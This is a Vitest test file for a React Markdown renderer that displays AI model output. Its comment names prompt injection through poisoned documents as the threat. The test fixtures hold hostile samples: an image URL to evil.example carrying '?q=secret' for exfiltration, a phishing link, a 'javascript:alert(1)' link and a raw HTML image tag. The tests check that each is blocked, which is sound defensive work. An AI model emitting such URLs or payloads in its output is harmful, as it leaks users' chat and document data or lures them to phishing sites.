import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { Markdown } from './ui';

// Model output can be steered by a poisoned document (prompt injection), so
// rendering it must never make a network request or navigate (AGENTS.md §9).
describe('Markdown', () => {
  it('never loads remote images: an image URL could carry chat or KB text out', () => {
    const { container } = render(<Markdown text={'![chart](https://evil.example/p.png?q=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText(/image blocked/i)).toHaveTextContent('evil.example');
    expect(container.innerHTML).not.toContain('q=secret');
  });

  it('renders links as text with their real host, not as navigable anchors', () => {
    const { container } = render(<Markdown text={'[your bank](https://phish.example/login)'} />);
    expect(container.querySelector('a[href]')).toBeNull();
    expect(screen.getByText('your bank')).toBeInTheDocument();
    expect(screen.getByText('phish.example')).toBeInTheDocument();
  });

  it('copies a link instead of opening it', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
    render(<Markdown text={'See [docs](https://example.com/a).'} />);
    await userEvent.click(screen.getByRole('button', { name: 'Copy link https://example.com/a' }));
    expect(writeText).toHaveBeenCalledWith('https://example.com/a');
  });

  it('drops javascript: links entirely', () => {
    const { container } = render(<Markdown text={'[x](javascript:alert(1))'} />);
    expect(container.innerHTML).not.toContain('javascript:');
    expect(screen.queryByRole('button', { name: /copy link/i })).toBeNull();
  });

  it('does not render raw HTML from the model', () => {
    const { container } = render(<Markdown text={'<img src="https://evil.example/x.png"><b>hi</b>'} />);
    expect(container.querySelector('img, b')).toBeNull();
  });
});
